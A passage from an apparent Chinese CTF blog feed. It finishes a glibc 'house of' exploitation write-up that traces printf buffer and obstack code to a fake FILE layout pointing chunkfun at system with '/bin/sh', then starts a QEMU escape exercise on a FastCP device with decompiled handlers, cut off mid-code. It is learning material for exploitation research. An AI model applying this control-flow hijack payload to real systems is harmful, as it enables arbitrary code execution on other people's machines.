class="title">printf_buffer_as_file</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Interface to libio.  */</span></span><br><span class="line">  FILE stream;</span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Pointer to the underlying buffer.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到这个结构体的前面两个成员其实就相当于<code>_IO_FILE_plus</code>结构体，再在后面跟了一个指针。</p><p>这个函数的目标是执行到<code>__printf_buffer_flush</code>，所以需要通过前面的验证。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">__printf_buffer_as_file_commit (struct __printf_buffer_as_file *file)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Check that the write pointers in the file stream are consistent</span></span><br><span class="line"><span class="comment">     with the next buffer.  */</span></span><br><span class="line">  assert (file-&gt;stream._IO_write_ptr &gt;= file-&gt;next-&gt;write_ptr);</span><br><span class="line">  assert (file-&gt;stream._IO_write_ptr &lt;= file-&gt;next-&gt;write_end);</span><br><span class="line">  assert (file-&gt;stream._IO_write_base == file-&gt;next-&gt;write_base);</span><br><span class="line">  assert (file-&gt;stream._IO_write_end == file-&gt;next-&gt;write_end);</span><br><span class="line"> </span><br><span class="line">  file-&gt;next-&gt;write_ptr = file-&gt;stream._IO_write_ptr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span></span><br><span class="line">__printf_buffer_putc (struct __printf_buffer *buf, <span class="keyword">char</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (buf-&gt;write_ptr != buf-&gt;write_end)</span><br><span class="line">      *buf-&gt;write_ptr++ = ch;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    __printf_buffer_putc_1 (buf, ch);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里第一个函数中就是验证了next指针的内容。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> *write_base;</span><br><span class="line">  <span class="keyword">char</span> *write_ptr;</span><br><span class="line">  <span class="keyword">char</span> *write_end;</span><br><span class="line">  <span class="keyword">uint64_t</span> written;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Identifies the flush callback.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">enum</span> __<span class="title">printf_buffer_mode</span> <span class="title">mode</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>成功绕过上面的判断之后进入下面这个函数:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">__printf_buffer_do_flush (struct __printf_buffer *buf)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">switch</span> (buf-&gt;mode)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_failed:</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_sprintf:</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_snprintf:</span><br><span class="line">      __printf_buffer_flush_snprintf ((struct __printf_buffer_snprintf *) buf);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_sprintf_chk:</span><br><span class="line">      __chk_fail ();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_to_file:</span><br><span class="line">      __printf_buffer_flush_to_file ((struct __printf_buffer_to_file *) buf);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_asprintf:</span><br><span class="line">      __printf_buffer_flush_asprintf ((struct __printf_buffer_asprintf *) buf);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_dprintf:</span><br><span class="line">      __printf_buffer_flush_dprintf ((struct __printf_buffer_dprintf *) buf);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_strfmon:</span><br><span class="line">      __set_errno (E2BIG);</span><br><span class="line">      __printf_buffer_mark_failed (buf);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_fp:</span><br><span class="line">      __printf_buffer_flush_fp ((struct __printf_buffer_fp *) buf);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_fp_to_wide:</span><br><span class="line">      __printf_buffer_flush_fp_to_wide</span><br><span class="line">        ((struct __printf_buffer_fp_to_wide *) buf);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_fphex_to_wide:</span><br><span class="line">      __printf_buffer_flush_fphex_to_wide</span><br><span class="line">        ((struct __printf_buffer_fphex_to_wide *) buf);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_obstack:</span><br><span class="line">      __printf_buffer_flush_obstack ((struct __printf_buffer_obstack *) buf);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  __builtin_trap ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里最终目标是<code>__printf_buffer_flush_obstack</code>函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">__printf_buffer_flush_obstack (struct __printf_buffer_obstack *buf)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* About to switch buffers, so record the bytes written so far.  */</span></span><br><span class="line">  buf-&gt;base.written += buf-&gt;base.write_ptr - buf-&gt;base.write_base;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (buf-&gt;base.write_ptr == &amp;buf-&gt;ch + <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Errors are reported via a callback mechanism (presumably for</span></span><br><span class="line"><span class="comment"> process termination).  */</span></span><br><span class="line">      obstack_1grow (buf-&gt;obstack, buf-&gt;ch);</span><br><span class="line">      buf-&gt;base.write_base = obstack_next_free (buf-&gt;obstack);</span><br><span class="line">      buf-&gt;base.write_ptr = buf-&gt;base.write_base;</span><br><span class="line">      <span class="keyword">size_t</span> size = obstack_room (buf-&gt;obstack);</span><br><span class="line">      buf-&gt;base.write_end = buf-&gt;base.write_ptr + size;</span><br><span class="line">      <span class="comment">/* Reserve the space on the obstack size.  */</span></span><br><span class="line">      obstack_blank_fast (buf-&gt;obstack, size);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Obtain the extra character.  */</span></span><br><span class="line">      buf-&gt;base.write_base = &amp;buf-&gt;ch;</span><br><span class="line">      buf-&gt;base.write_ptr = &amp;buf-&gt;ch;</span><br><span class="line">      buf-&gt;base.write_end = &amp;buf-&gt;ch + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数的目标就是<code>obstack_1grow</code>，前面的绕过方式很简单，直接绕过就行。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> obstack_1grow(OBSTACK, datum)      \</span></span><br><span class="line"><span class="meta">  __extension__      \</span></span><br><span class="line"><span class="meta">    (&#123; struct obstack *__o = (OBSTACK);      \</span></span><br><span class="line"><span class="meta">       <span class="meta-keyword">if</span> (__o-&gt;next_free + 1 &gt; __o-&gt;chunk_limit)      \</span></span><br><span class="line"><span class="meta"> _obstack_newchunk (__o, 1);      \</span></span><br><span class="line"><span class="meta">       obstack_1grow_fast (__o, datum);      \</span></span><br><span class="line"><span class="meta">       (void) 0; &#125;)</span></span><br></pre></td></tr></table></figure><p>然后执行这个宏，宏中就有了我们熟悉的<code>_obstack_newchunk</code>函数了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">_obstack_newchunk (struct obstack *h, <span class="keyword">int</span> length)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *<span class="title">old_chunk</span> =</span> h-&gt;chunk;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *<span class="title">new_chunk</span>;</span></span><br><span class="line">  <span class="keyword">long</span> new_size;</span><br><span class="line">  <span class="keyword">long</span> obj_size = h-&gt;next_free - h-&gt;object_base;</span><br><span class="line">  <span class="keyword">long</span> i;</span><br><span class="line">  <span class="keyword">long</span> already;</span><br><span class="line">  <span class="keyword">char</span> *object_base;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Compute size for new chunk.  */</span></span><br><span class="line">  new_size = (obj_size + length) + (obj_size &gt;&gt; <span class="number">3</span>) + h-&gt;alignment_mask + <span class="number">100</span>;</span><br><span class="line">  <span class="keyword">if</span> (new_size &lt; h-&gt;chunk_size)</span><br><span class="line">    new_size = h-&gt;chunk_size;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Allocate and initialize the new chunk.  */</span></span><br><span class="line">  new_chunk = CALL_CHUNKFUN (h, new_size);</span><br><span class="line">  <span class="keyword">if</span> (!new_chunk)</span><br><span class="line">    (*obstack_alloc_failed_handler)();</span><br><span class="line">  h-&gt;chunk = new_chunk;</span><br><span class="line">  new_chunk-&gt;prev = old_chunk;</span><br><span class="line">  new_chunk-&gt;limit = h-&gt;chunk_limit = (<span class="keyword">char</span> *) new_chunk + new_size;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Compute an aligned object_base in the new chunk */</span></span><br><span class="line">  object_base =</span><br><span class="line">    __PTR_ALIGN ((<span class="keyword">char</span> *) new_chunk, new_chunk-&gt;contents, h-&gt;alignment_mask);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Move the existing object to the new chunk.</span></span><br><span class="line"><span class="comment">     Word at a time is fast and is safe if the object</span></span><br><span class="line"><span class="comment">     is sufficiently aligned.  */</span></span><br><span class="line">  <span class="keyword">if</span> (h-&gt;alignment_mask + <span class="number">1</span> &gt;= DEFAULT_ALIGNMENT)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> (i = obj_size / <span class="keyword">sizeof</span> (COPYING_UNIT) - <span class="number">1</span>;</span><br><span class="line">   i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">((COPYING_UNIT *) object_base)[i]</span><br><span class="line">  = ((COPYING_UNIT *) h-&gt;object_base)[i];</span><br><span class="line">      <span class="comment">/* We used to copy the odd few remaining bytes as one extra COPYING_UNIT,</span></span><br><span class="line"><span class="comment"> but that can cross a page boundary on a machine</span></span><br><span class="line"><span class="comment"> which does not do strict alignment for COPYING_UNITS.  */</span></span><br><span class="line">      already = obj_size / <span class="keyword">sizeof</span> (COPYING_UNIT) * <span class="keyword">sizeof</span> (COPYING_UNIT);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    already = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">/* Copy remaining bytes one by one.  */</span></span><br><span class="line">  <span class="keyword">for</span> (i = already; i &lt; obj_size; i++)</span><br><span class="line">    object_base[i] = h-&gt;object_base[i];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* If the object just copied was the only data in OLD_CHUNK,</span></span><br><span class="line"><span class="comment">     free that chunk and remove it from the chain.</span></span><br><span class="line"><span class="comment">     But not if that chunk might contain an empty object.  */</span></span><br><span class="line">  <span class="keyword">if</span> (!h-&gt;maybe_empty_object</span><br><span class="line">      &amp;&amp; (h-&gt;object_base</span><br><span class="line">  == __PTR_ALIGN ((<span class="keyword">char</span> *) old_chunk, old_chunk-&gt;contents,</span><br><span class="line">  h-&gt;alignment_mask)))</span><br><span class="line">    &#123;</span><br><span class="line">      new_chunk-&gt;prev = old_chunk-&gt;prev;</span><br><span class="line">      CALL_FREEFUN (h, old_chunk);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  h-&gt;object_base = object_base;</span><br><span class="line">  h-&gt;next_free = h-&gt;object_base + obj_size;</span><br><span class="line">  <span class="comment">/* The new chunk certainly contains no empty object yet.  */</span></span><br><span class="line">  h-&gt;maybe_empty_object = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里又可以看到我们熟悉的宏<code>CALL_CHUNKFUN</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> CALL_CHUNKFUN(h, size) \</span></span><br><span class="line"><span class="meta">  (((h)-&gt;use_extra_arg)      \</span></span><br><span class="line"><span class="meta">   ? (*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (size))      \</span></span><br><span class="line"><span class="meta">   : (*(struct _obstack_chunk *(*)(long))(h)-&gt;chunkfun)((size)))</span></span><br></pre></td></tr></table></figure><p>当<code>(h)-&gt;use_extra_arg</code>不为0时即可执行到<code>(h)-&gt;chunkfun</code>。现在就是整条链子的调用了。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这里没有一点一点分析每个if语句应该怎么写，这里直接给出总的就行。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">*(A + <span class="number">0x20</span>) = <span class="number">0</span>;</span><br><span class="line">*(A + <span class="number">0x28</span>) = A + <span class="number">0x119</span>;</span><br><span class="line">*(A + <span class="number">0x30</span>) = A + <span class="number">0x119</span>;</span><br><span class="line">*(A + <span class="number">0xd8</span>) = _IO_printf_buffer_as_file_jumps;</span><br><span class="line">*(A + <span class="number">0xe0</span>) = A + <span class="number">0xe8</span>;</span><br><span class="line">*(A + <span class="number">0xe8</span>) = <span class="number">0</span>;</span><br><span class="line">*(A + <span class="number">0xf0</span>) = <span class="number">0</span>;</span><br><span class="line">*(A + <span class="number">0xf8</span>) = A + <span class="number">0x119</span>;</span><br><span class="line">*(A + <span class="number">0x108</span>) = <span class="number">11</span>;</span><br><span class="line">*(A + <span class="number">0x110</span>) = A + <span class="number">0x110</span>;</span><br><span class="line">*(A + <span class="number">0x128</span>) = <span class="number">0</span>;</span><br><span class="line">*(A + <span class="number">0x130</span>) = <span class="number">0</span>;</span><br><span class="line">*(A + <span class="number">0x148</span>) = &amp;system;</span><br><span class="line">*(A + <span class="number">0x158</span>) = &amp;bin_sh;</span><br><span class="line">*(A + <span class="number">0x160</span>) = <span class="number">1</span>;</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p>​    <a class="link"   href="https://mp.weixin.qq.com/s?__biz=Mzg4MjcxMTAwMQ==&amp;mid=2247486227&amp;idx=1&amp;sn=3ee610ce260b4a381bd0bcf202a34dec&amp;chksm=cf53cba5f82442b3f750ea969f480f9851793006f9223b04db9c5f7ad67c08a9f8db2661bed3&amp;mpshare=1&amp;scene=23&amp;srcid=03222uDWnBlUHhXPTbaEqKrs&amp;sharer_sharetime=1679449533105&amp;sharer_shareid=6eea79ff6da57fc6752ab0bc570bf392%23rd" >https://mp.weixin.qq.com/s?__biz=Mzg4MjcxMTAwMQ==&amp;mid=2247486227&amp;idx=1&amp;sn=3ee610ce260b4a381bd0bcf202a34dec&amp;chksm=cf53cba5f82442b3f750ea969f480f9851793006f9223b04db9c5f7ad67c08a9f8db2661bed3&amp;mpshare=1&amp;scene=23&amp;srcid=03222uDWnBlUHhXPTbaEqKrs&amp;sharer_sharetime=1679449533105&amp;sharer_shareid=6eea79ff6da57fc6752ab0bc570bf392%23rd<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这house of系列是真的多，上一个还没捂热下一个就来了，glibc更新也是真快。不过能在学习新东西的途中水一篇文章还是相当不错的。&lt;/p&gt;
&lt;h2 id=&quot;背景介绍&quot;&gt;&lt;a href=&quot;#背景介绍&quot; class=&quot;headerlink&quot; title=&quot;背景介绍&quot;&gt;&lt;/a</summary>
      
    
    
    
    <category term="pwn" scheme="https://cv196082.gitee.io/categories/pwn/"/>
    
    
    <category term="house of 系列" scheme="https://cv196082.gitee.io/tags/house-of-%E7%B3%BB%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>QEMU逃逸练习</title>
    <link href="https://cv196082.gitee.io/2023/03/21/QEMU%E9%80%83%E9%80%B8%E7%BB%83%E4%B9%A0/"/>
    <id>https://cv196082.gitee.io/2023/03/21/QEMU%E9%80%83%E9%80%B8%E7%BB%83%E4%B9%A0/</id>
    <published>2023-03-21T07:57:03.000Z</published>
    <updated>2023-03-21T07:58:58.961Z</updated>
    
    <content type="html"><![CDATA[<p>可以看得出来这篇文章的标题十分的水，因为确实是很难找到这两道题又什么闪光点来作为标题。这篇文章更新后会暂停学习qemu了，后续会进一步学习AFL以及开始接触docker逃逸。</p><h2 id="FastCP-ctf"><a href="#FastCP-ctf" class="headerlink" title="FastCP-ctf"></a>FastCP-ctf</h2><p>关于设备的分析可以参考前面两篇文章，这里就不再赘述了。</p><h3 id="函数分析"><a href="#函数分析" class="headerlink" title="函数分析"></a>函数分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint64_t</span> __fastcall <span class="title">fastcp_mmio_read</span><span class="params">(FastCPState *opaque, hwaddr addr, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( size != <span class="number">8</span> &amp;&amp; addr &lt;= <span class="number">0x1F</span> || addr &gt; <span class="number">0x1F</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( addr == <span class="number">8</span> )</span><br><span class="line">    <span class="keyword">return</span> opaque-&gt;cp_state.CP_list_src;</span><br><span class="line">  <span class="keyword">if</span> ( addr &lt;= <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !addr )</span><br><span class="line">      <span class="keyword">return</span> opaque-&gt;handling;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( addr != <span class="number">0x10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr == <span class="number">0x18</span> )</span><br><span class="line">      <span class="keyword">return</span> opaque-&gt;cp_state.cmd;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> opaque-&gt;cp_state.CP_list_cnt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先就是read函数这里是非常常规的一些内容。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">fastcp_mmio_write</span><span class="params">(FastCPState *opaque, hwaddr addr, <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int64_t</span> ns; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (size == <span class="number">8</span> || addr &gt; <span class="number">0x1F</span>) &amp;&amp; addr &lt;= <span class="number">0x1F</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr == <span class="number">0x10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( opaque-&gt;handling != <span class="number">1</span> )</span><br><span class="line">        opaque-&gt;cp_state.CP_list_cnt = val;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">0x18</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( opaque-&gt;handling != <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        opaque-&gt;cp_state.cmd = val;</span><br><span class="line">        ns = qemu_clock_get_ns(QEMU_CLOCK_VIRTUAL);</span><br><span class="line">        timer_mod(&amp;opaque-&gt;cp_timer, ns / <span class="number">1000000</span> + <span class="number">100</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">8</span> &amp;&amp; opaque-&gt;handling != <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;cp_state.CP_list_src = val;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再就是write函数，可以修改<code>opaque-&gt;cp_state.cmd</code>、<code>opaque-&gt;cp_state.CP_list_cnt</code>、<code>opaque-&gt;cp_state.CP_list_src</code>，并且可以看到中间会触发timer。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">fastcp_cp_timer</span><span class="params">(FastCPState *opaque)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uint64_t</span> cmd; <span class="comment">// rax</span></span><br><span class="line">  